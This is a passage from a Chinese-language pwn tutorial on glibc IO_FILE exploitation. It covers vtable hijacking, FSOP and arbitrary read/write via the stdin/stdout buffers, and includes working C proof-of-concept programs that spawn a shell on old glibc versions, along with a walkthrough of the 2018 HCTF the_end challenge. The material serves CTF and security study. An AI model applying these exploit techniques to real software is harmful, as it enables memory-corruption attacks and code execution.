地址，因此可以通过伪造 <code>vtable</code> 来调用所需函数 。</p>
<p>IO 调用的 vtable 函数：</p>
<p><code>fopen</code> 函数是在分配空间，建立 <code>FILE</code>
结构体，未调用 <code>vtable</code> 中的函数。</p>
<p><code>fread</code> 函数中调用的 <code>vtable</code> 函数有： -
<code>_IO_sgetn</code> 函数调用了 <code>vtable</code> 的
<code>_IO_file_xsgetn</code> 。 - <code>_IO_doallocbuf</code> 函数调用了
<code>vtable</code> 的 <code>_IO_file_doallocate</code>
以初始化输入缓冲区。 - <code>vtable</code> 中的
<code>_IO_file_doallocate</code> 调用了 <code>vtable</code> 中的
<code>__GI__IO_file_stat</code> 以获取文件信息。 -
<code>__underflow</code> 函数调用了 <code>vtable</code> 中的
<code>_IO_new_file_underflow</code> 实现文件数据读取。 -
<code>vtable</code> 中的 <code>_IO_new_file_underflow</code> 调用了
<code>vtable__GI__IO_file_read</code>
最终去执行系统调用<code>read</code>。</p>
<p><code>fwrite</code> 函数调用的 <code>vtable</code> 函数有： -
<code>_IO_fwrite</code> 函数调用了 <code>vtable</code> 的
<code>_IO_new_file_xsputn</code> 。 - <code>_IO_new_file_xsputn</code>
函数调用了 <code>vtable</code> 中的 <code>_IO_new_file_overflow</code>
实现缓冲区的建立以及刷新缓冲区。 - <code>vtable</code> 中的
<code>_IO_new_file_overflow</code> 函数调用了 <code>vtable</code> 的
<code>_IO_file_doallocate</code> 以初始化输入缓冲区。 -
<code>vtable</code> 中的 <code>_IO_file_doallocate</code> 调用了
<code>vtable</code> 中的 <code>__GI__IO_file_stat</code>
以获取文件信息。 - <code>new_do_write</code> 中的
<code>_IO_SYSWRITE</code> 调用了 <code>vtable_IO_new_file_write</code>
最终去执行系统调用<code>write</code>。</p>
<p><code>fclose</code> 函数调用的 <code>vtable</code> 函数有： -
在清空缓冲区的 <code>_IO_do_write</code> 函数中会调用
<code>vtable</code> 中的函数。 - 关闭文件描述符
<code>_IO_SYSCLOSE</code> 函数为 <code>vtable</code> 中的
<code>__close</code> 函数。 - <code>_IO_FINISH</code> 函数为
<code>vtable</code> 中的 <code>__finish</code> 函数。</p>
<p>下面举一个实际的例子： <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> i64;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">char</span> i8;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    FILE *fp = <span class="built_in">fopen</span>(<span class="string">&quot;./123.txt&quot;</span>, <span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    i64 *fake_vtable = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    fake_vtable[<span class="number">7</span>] = (i64) &amp;system;</span><br><span class="line">    i64 *vtable_addr = (i64 *) ((i8 *) fp + <span class="number">0xD8</span>);</span><br><span class="line">    *vtable_addr = (i64) fake_vtable;</span><br><span class="line">    <span class="built_in">memcpy</span>(fp, <span class="string">&quot;sh&quot;</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="built_in">fwrite</span>(<span class="string">&quot;hi&quot;</span>, <span class="number">2</span>, <span class="number">1</span>, fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 使用的 libc 版本如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GNU C Library (Ubuntu GLIBC 2.23-0ubuntu11.3) stable release version 2.23, by Roland McGrath et al.</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.</span><br><span class="line">There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 5.4.0 20160609.</span><br><span class="line">Available extensions:</span><br><span class="line">	crypt add-on version 2.1 by Michael Glad and others</span><br><span class="line">	GNU Libidn by Simon Josefsson</span><br><span class="line">	Native POSIX Threads Library by Ulrich Drepper et al</span><br><span class="line">	BIND-8.2.3-T5B</span><br><span class="line">libc ABIs: UNIQUE IFUNC</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span><br></pre></td></tr></table></figure></div>
<p>此版本 libc 没有 <code>_IO_vtable_check</code> 检查，因此可以随意伪造
<code>vtable</code> 。 在执行 <code>fwrite</code> 时会调用
<code>vtable</code> 中的 <code>_IO_new_file_xsputn</code> ，参数为对应的
<code>_IO_FILE_plus</code> ，因此在伪造的 <code>vtable</code>
对应位置上写入 <code>system</code> 地址，并在 <code>_IO_FILE_plus</code>
所在地址写入 <code>sh\x00</code> ，然后调用 <code>fwrite</code> 即可得到
shell 。 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/31f2c653ca8ba5a889437b6e7522adc8.png"
                     
alt="在这里插入图片描述" 
                > 例题：<a class="link" 
 href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/io-file/2018_hctf_the_end/" >2018
HCTF the_end <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">sleep</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;here is a gift %p, good luck ;)\n&quot;</span>, &amp;sleep);</span><br><span class="line">  <span class="built_in">fflush</span>(_bss_start);</span><br><span class="line">  <span class="built_in">close</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">close</span>(<span class="number">2</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">8uLL</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">1uLL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1337</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>分析程序，发现可以获取 libc 基地址，然后有 5 次 1 字节的任意地址写。
<code>exit</code> 函数会执行 <code>_IO_cleanup</code> 函数。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_cleanup (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* We do *not* want locking.  Some threads might use streams but</span></span><br><span class="line"><span class="comment">     that is their problem, we flush them underneath them.  */</span></span><br><span class="line">  <span class="type">int</span> result = _IO_flush_all_lockp (<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We currently don&#x27;t have a reliable mechanism for making sure that</span></span><br><span class="line"><span class="comment">     C++ static destructors are executed in the correct order.</span></span><br><span class="line"><span class="comment">     So it is possible that other static destructors might want to</span></span><br><span class="line"><span class="comment">     write to cout - and they&#x27;re supposed to be able to do so.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The following will make the standard streambufs be unbuffered,</span></span><br><span class="line"><span class="comment">     which forces any output from late destructors to be written out. */</span></span><br><span class="line">  _IO_unbuffer_all ();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>其中 <code>_IO_flush_all_lockp</code>
函数如果缓冲区有数据没有输出会执行 <code>_IO_overflow</code>
，<code>_IO_unbuffer_all</code> 函数会执行 <code>_IO_setbuf</code> 。
这里调试发现只执行后者，因此可以在 <code>_IO_2_1_stderr_</code> 中伪造
<code>vtable</code> 使得 <code>_IO_setbuf</code> 位置恰好为某个指向 libc
附近的指针。然后再修改 <code>FILE</code> 使得 <code>*vtable</code>
指向伪造的 <code>vtable</code> 。最后 <code>exit</code> 得到 shell 。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/ba6f899dba2824e1508bbeac6dc19363.png"
                      alt="在这里插入图片描述" style="zoom: 50%;" 
                ></p>
<h1 id="fsop">FSOP</h1>
<p>FSOP 的核心思想就是劫持 <code>_IO_list_all</code> 指向伪造的
<code>_IO_FILE_plus</code> 。之后使程序执行
<code>_IO_flush_all_lockp</code> 函数。该函数会刷新
<code>_IO_list_all</code> 链表中所有项的文件流，相当于对每个
<code>FILE</code> 调用 <code>fflush</code> ，也对应着会调用
<code>_IO_FILE_plus.vtable</code> 中的 <code>_IO_overflow</code> 。</p>
<p>在利用时要注意以下几点： - 程序执行 <code>_IO_flush_all_lockp</code>
函数有三种情况： - 当 <code>libc</code> 执行 <code>abort</code> 流程时 -
当执行 <code>exit</code> 函数时 - 当执行流从 <code>main</code>
函数返回时 - 伪造的 <code>_IO_FILE_plus</code> 中的 <code>FILE</code>
需要绕过如下检查：</p>
<pre><code><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)) &amp;&amp; _IO_OVERFLOW(fp, EOF) == EOF) &#123;</span><br><span class="line">    result = EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></code></pre>
<ul>
<li>由于 <code>vtable</code> 伪造的位置绕不过
<code>_IO_vtable_check</code> 的检查，因此仅适应于 libc2.24
版本以下。</li>
</ul>
<p>下面举一个 FSOP 的实际例子：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> i64;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    i64 libc_base = (i64) &amp;puts - <span class="number">0x6F5D0</span>;</span><br><span class="line">    i64 *ptr = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">    ptr[<span class="number">24</span>] = <span class="number">0x0</span>;<span class="comment">//_mode</span></span><br><span class="line">    ptr[<span class="number">5</span>] = <span class="number">0x1</span>;<span class="comment">//_IO_write_ptr</span></span><br><span class="line">    ptr[<span class="number">4</span>] = <span class="number">0x0</span>;<span class="comment">//_IO_write_base</span></span><br><span class="line">    ptr[<span class="number">27</span>] = (i64) &amp;ptr[<span class="number">32</span>];<span class="comment">//*vtable</span></span><br><span class="line">    ptr[<span class="number">32</span> + <span class="number">3</span>] = libc_base + <span class="number">0x4525A</span>;<span class="comment">//_IO_overflow</span></span><br><span class="line">    i64 *list_all_ptr = (i64 *) (libc_base + <span class="number">0x3C4520</span>);</span><br><span class="line">    list_all_ptr[<span class="number">0</span>] = (i64) ptr;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>使用的 libc 版本如下： <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GNU C Library (Ubuntu GLIBC 2.23-0ubuntu3) stable release version 2.23, by Roland McGrath et al.</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.</span><br><span class="line">There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 5.3.1 20160413.</span><br><span class="line">Available extensions:</span><br><span class="line">	crypt add-on version 2.1 by Michael Glad and others</span><br><span class="line">	GNU Libidn by Simon Josefsson</span><br><span class="line">	Native POSIX Threads Library by Ulrich Drepper et al</span><br><span class="line">	BIND-8.2.3-T5B</span><br><span class="line">libc ABIs: UNIQUE IFUNC</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span><br></pre></td></tr></table></figure></div> 上述程序利用过程如下图 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/fad85d11f5ddfbc00c817d6af8a8dbb1.png"
                     
alt="在这里插入图片描述" 
                > 最后 <code>exit(0)</code> 进行如下函数调用：
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/fe87cde62122bed3d4cb7a8a1e1a5d46.png"
                      alt="在这里插入图片描述" style="zoom: 50%;" 
                >
程序执行效果： <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/cc7c6fdbbb535a472618b90c8e268fd9.png"
                     
alt="在这里插入图片描述" 
                ></p>
<h1 id="缓冲区的相关利用">缓冲区的相关利用</h1>
<h2 id="stdin-标准输入缓冲区进行任意地址写">stdin
标准输入缓冲区进行任意地址写</h2>
<p>根据前面对 <code>fread</code>
的分析已经知道通过缓冲区进行输入的大致流程，但要实现任意地址写还要绕过其中具体的检查。</p>
<ul>
<li><code>_IO_file_xsgetn</code>
<ul>
<li><code>fp-&gt;_IO_buf_base</code> 为空时会执行
<code>_IO_doallocbuf(fp)</code> 初始化缓冲区，因此
<code>fp-&gt;_IO_buf_base</code> 不能为空。 <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">free</span>(fp-&gt;_IO_save_base);</span><br><span class="line">        fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">    &#125;</span><br><span class="line">    _IO_doallocbuf(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
<li>如果 <code>fp-&gt;_IO_read_end</code> &gt;
<code>fp-&gt;_IO_read_ptr</code>
会将缓冲区中对应的数据复制到目标地址中，为了避免因为这个出现不必要的问题，最好令
<code>fp-&gt;_IO_read_end</code> = <code>fp-&gt;_IO_read_ptr</code> 。
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (have &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    s = __mempcpy(s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">    want -= have;</span><br><span class="line">    fp-&gt;_IO_read_ptr += have;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
<li>如果需要读入的数据长度如果大于缓冲区大小会采用直接读入的方式，因此不能使读入的数据长度大于缓冲区大小。
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; want &lt; (<span class="type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (__underflow(fp) == EOF)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul></li>
<li><code>_IO_new_file_underflow</code>
<ul>
<li><code>_flags</code> 的 <code>_IO_NO_READS</code> 标志为不能为 1
。标志的定义是 <code>#define _IO_NO_READS 4</code> 。
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS) &#123;</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">    __set_errno(EBADF);</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
<li>最终系统调用
<code>_IO_SYSREAD (fp, fp-&gt;_IO_buf_base,fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)</code>
读取数据，因此要想利用stdin输入缓冲区需设置 <code>FILE</code> 结构体中
<code>_IO_buf_base</code> 为<code>write_start</code>
，<code>_IO_buf_end</code> 为 <code>write_end</code>
。同时也需将结构体中的 <code>fp-&gt;_fileno</code> 设置为 0 ，最终调用
<code>read (fp-&gt;_fileno, buf, size))</code> 读取数据。
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">count = _IO_SYSREAD(fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br></pre></td></tr></table></figure></div></li>
</ul></li>
</ul>
<p>将上述条件综合表述为：</p>
<ul>
<li>设置 <code>_IO_read_end</code> 等于 <code>_IO_read_ptr</code>
。</li>
<li>设置 <code>_flag</code> &amp;~ <code>_IO_NO_READS</code> 即
<code>_flag</code> &amp;~ 0x4。</li>
<li>设置 <code>_fileno</code> 为 0 ，表示读入数据的来源是
<code>stdin</code> 。</li>
<li>设置 <code>_IO_buf_base</code> 为 <code>write_start</code>
，<code>_IO_buf_end</code> 为 <code>write_end</code> ；且使得
<code>_IO_buf_end</code> - <code>_IO_buf_base</code> 大于
<code>fread</code> 要读的数据。</li>
</ul>
<p>举例： <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> i64;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> stack_buf[<span class="number">100</span>];</span><br><span class="line"><span class="comment">//    i64 libc_base = (i64) &amp;puts - 0x84420;</span></span><br><span class="line">    FILE *fp = <span class="built_in">fopen</span>(<span class="string">&quot;123.txt&quot;</span>, <span class="string">&quot;rw&quot;</span>);</span><br><span class="line"><span class="comment">//    FILE *fp = (FILE *) (libc_base + 0x1EC980);</span></span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_read_ptr = <span class="number">0x0</span>;</span><br><span class="line">    fp-&gt;_flags &amp;= ~<span class="number">0x4</span>;</span><br><span class="line">    fp-&gt;_fileno = <span class="number">0x0</span>;</span><br><span class="line">    fp-&gt;_IO_buf_base = (<span class="type">char</span> *) buf;</span><br><span class="line">    fp-&gt;_IO_buf_end = (<span class="type">char</span> *) &amp;buf[<span class="number">99</span>];</span><br><span class="line">    <span class="built_in">fread</span>(stack_buf, <span class="number">1</span>, <span class="number">3</span>, fp);</span><br><span class="line"><span class="comment">//    scanf(&quot;%s&quot;, stack_buf);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buf: %s\n&quot;</span>, buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stack_buf: %s\n&quot;</span>, stack_buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> libc 采用如下版本： <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.8) stable release version 2.31.</span><br><span class="line">Copyright (C) 2020 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.</span><br><span class="line">There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 9.4.0.</span><br><span class="line">libc ABIs: UNIQUE IFUNC ABSOLUTE</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span><br></pre></td></tr></table></figure></div> 运行结果：
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">aaaaaaaaaaaaaaaaaaa</span><br><span class="line">buf: aaaaaaaaaaaaaaaaaaa</span><br><span class="line"></span><br><span class="line">stack_buf: aaa</span><br></pre></td></tr></table></figure></div> ## stdout 标准输入缓冲区进行任意地址读写
<code>stdout</code> 可以把某地址数据复制到缓冲区，然后输出出来。如果可控
<code>stdout</code>
结构体，通过构造可实现利用其进行任意地址读以及任意地址写。 ###
任意地址写 <code>_IO_new_file_xsputn</code> 函数中有如下操作：
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"><span class="comment">/* Then fill the buffer. */</span></span><br><span class="line"><span class="keyword">if</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (count &gt; to_do)count = to_do;</span><br><span class="line">    f-&gt;_IO_write_ptr = __mempcpy(f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">    s += count;</span><br><span class="line">    to_do -= count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
即当输出缓冲区不满的时候，就将待输出数据复制到输出缓冲区。因此只要将<code>_IO_write_ptr</code>
指向 <code>write_start</code> ，<code>_IO_write_end</code> 指向
<code>write_end</code> 即可实现在目标地址写入数据。 举例（libc
版本同上）：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> i64;</span><br><span class="line"><span class="type">char</span> buf[] = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> stack_buf[] = <span class="string">&quot;abcdefghi&quot;</span>;</span><br><span class="line">    i64 libc_base = (i64) &amp;puts - <span class="number">0x84420</span>;</span><br><span class="line">    FILE *fp = (FILE *) (libc_base + <span class="number">0x1ed6a0</span>);</span><br><span class="line">    fp-&gt;_IO_write_ptr = (<span class="type">char</span> *) &amp;buf[<span class="number">0</span>];</span><br><span class="line">    fp-&gt;_IO_write_end = (<span class="type">char</span> *) &amp;buf[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">puts</span>(stack_buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buf: %s\n&quot;</span>, buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>运行结果： <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">efghi</span><br><span class="line">buf: abcd56</span><br></pre></td></tr></table></figure></div> 其中复制到 <code>buf</code>
中的数据没有输出的原因是 <code>_IO_overflow</code>
函数没有正常执行，接下来任意地址读会有更多分析。 ### 任意地址读
程序正确执行到 <code>_IO_overflow</code>
时会将输出缓冲区中的数据输出出来，只要将要泄露的位置设置为输出缓冲区就可以泄露内容。但还要绕过一系列检查：
- <code>_IO_new_file_xsputn</code> - 如果
<code>f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr</code>
说明输出缓冲区还没有写满，就会将待输出的数据写入缓冲区，实际上
<code>_IO_overflow</code>
只有在输出缓冲区写满的时候才将其输出。因此为了不造成不必要的麻烦，直接令
<code>f-&gt;_IO_write_end = f-&gt;_IO_write_ptr</code> 。 <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"><span class="comment">/* Then fill the buffer. */</span></span><br><span class="line"><span class="keyword">if</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (count &gt; to_do)count = to_do;</span><br><span class="line">    f-&gt;_IO_write_ptr = __mempcpy(f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">    s += count;</span><br><span class="line">    to_do -= count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
- <code>_IO_new_file_overflow</code> - <code>_flags</code> 不能包含
<code>_IO_NO_WRITES</code> ，其中 <code>_IO_NO_WRITES</code> 的值为 0x8
。 <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">&#123;</span><br><span class="line">    f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">    __set_errno(EBADF);</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> - 为了避免进入如下分枝进造成不必要的麻烦，
<code>_flags</code> 应包含 <code>_IO_CURRENTLY_PUTTING</code> ，其中
<code>_IO_CURRENTLY_PUTTING</code> 的值为 0x0800 。 <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> -
为了调用 <code>_IO_do_write</code> 输出缓冲区内容，令
<code>_IO_write_base = read_start</code>
，<code>_IO_write_ptr = read_end</code> 。</p>
<pre><code><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write(f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br></pre></td></tr></table></figure></div></code></pre>
<ul>
<li><code>new_do_write</code>
<ul>
<li><p>构造 <code>_flags</code> 包含 <code>_IO_IS_APPENDING</code> 或者
<code>_IO_read_end</code> 等于 <code>_IO_write_base</code>
就可以直接执行到 <code>_IO_SYSWRITE</code> 。其中
<code>_IO_IS_APPENDING</code> 的值为 0x1000 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> count;</span><br><span class="line"> <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">   <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">      you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">      not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">      Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">      unpredictable. */</span></span><br><span class="line">   fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="type">off64_t</span> new_pos</span><br><span class="line">= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">     <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">     fp-&gt;_offset = new_pos;</span><br><span class="line">   &#125;</span><br><span class="line"> count = _IO_SYSWRITE (fp, data, to_do);</span><br></pre></td></tr></table></figure></div></li>
</ul></li>
